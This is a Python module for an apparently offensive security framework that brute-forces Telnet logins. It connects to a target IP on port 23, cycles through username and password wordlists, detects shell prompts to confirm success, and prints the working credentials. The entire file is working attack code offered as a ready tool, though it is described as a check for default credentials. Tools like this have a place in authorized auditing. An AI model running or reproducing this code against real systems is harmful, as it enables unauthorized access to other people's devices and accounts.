import smf
from apps.utility.colors import CC

metadata = {
    "Name": "Bruteforce Telnet login",
    "Description": """
Matching Telnet login username and password
to find out if a Telnet is using standard login auth.
Using 2 test stages, the first with standard auth
The second stage uses the custom keyword.
""",
    "Author": ["zxelzy"],
    "Action": [
        ["Bruteforce", {"Description": "Bypass Telnet login"}],
    ],
    "DefaultAction": "Bruteforce",
    "License": "SMF License",
    "Date": "2025-08-19",
}

SYM_SUCCESS = "🔑"
SYM_FAILED = "🔒"

REQUIRED_OPTIONS = {
    "IP": "",
    "PASS": "fill with wordlist password",
    "USER": "fill with wordlist username",
}


def read_wordlist(filepath):
    """
    Generator untuk membaca file wordlist baris per baris.
    """
    try:
        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                # Hapus newline dan spasi di ujung
                word = line.strip()
                # Lewati baris kosong
                if word:
                    yield word
    except FileNotFoundError:
        smf.printd("File not found", filepath, level="WARN")
        return
    except Exception as e:
        smf.printd(f"Failed to read file {filepath}", e, level="ERROR")
        return


def execute(options, net):
    # Ambil parameter
    ip = options.get("IP")
    port = 23
    username_file = options.get("USER")   # path file daftar username
    password_file = options.get("PASS")   # path file daftar password

    # Prompt yang umum
    promt_login = ["login:", "Login:"]
    promt_pass = ["password:", "pass:", "Password:", "Pass:"]
    promt_shell = [
        "/ $", "$", "#", ">", "%",
        "welcome", "last login", "password changed", "press enter",
    ]

    smf.printf(f"{CC.CYAN}[*] Starting Telnet Bruteforce => {ip}:23{CC.RESET}\n")

    # Baca semua password sekali (jika file terlalu besar, pertimbangkan alternatif)
    # Namun untuk keperluan brute force, biasanya wordlist tidak terlalu besar.
    passwords = list(read_wordlist(password_file))
    if not passwords:
        smf.printf(f"{CC.RED}[!] Password wordlist is empty or unreadable.{CC.RESET}")
        return

    success = False

    # Loop setiap username
    for username in read_wordlist(username_file):
        if not username:
            continue

        smf.printf(f"{CC.CYAN}[*] Trying username: {username}{CC.RESET}")

        # Coba semua password untuk username ini
        for password in passwords:
            con = None
            try:
                con = net.Telnet(ip, port, timeout=10.0)

                # Kirim username, tunggu prompt password
                _, r = con.send(username, expected=promt_pass)
                if r < 0:
                    # Username ditolak, tidak perlu lanjut ke password
                    smf.printf(f"{CC.YELLOW}[*] Username: {username} {SYM_FAILED}{CC.RESET}")
                    break   # keluar dari loop password, lanjut ke username berikutnya

                # Username diterima, kirim password
                _, r = con.send(password, expected=promt_shell)
                if r >= 0:
                    # Berhasil login!
                    smf.printf(
                        f"{CC.GREEN}[✓] Bruteforce successful. U={username}:P={password} {SYM_SUCCESS}{CC.RESET}\n"
                    )
                    success = True
                    return  # berhenti total

                # Jika password salah, koneksi ditutup, lanjut ke password berikutnya
                # (tidak perlu pesan setiap kali gagal)

            except KeyboardInterrupt:
                smf.printf(f"\n{CC.YELLOW}[*] Bruteforce stopped.{CC.RESET}")
                return
            except Exception as e:
                # Error koneksi, mungkin timeout, lewati password ini
                smf.printf(f"Error while trying {username}:{password}", e)
                # Jangan langsung return, coba password lain
                continue
            finally:
                if con:
                    con.close()

        # Jika semua password gagal untuk username ini, lanjut ke username berikutnya

    if not success:
        smf.printf(
            f"{CC.YELLOW}[!] Bruteforce failed, no valid combination found.{CC.RESET}"
        )

    smf.printf(
        f"{CC.GREEN}[*] Telnet brute daemon successfully stopped and cleaned up.{CC.RESET}"
    )
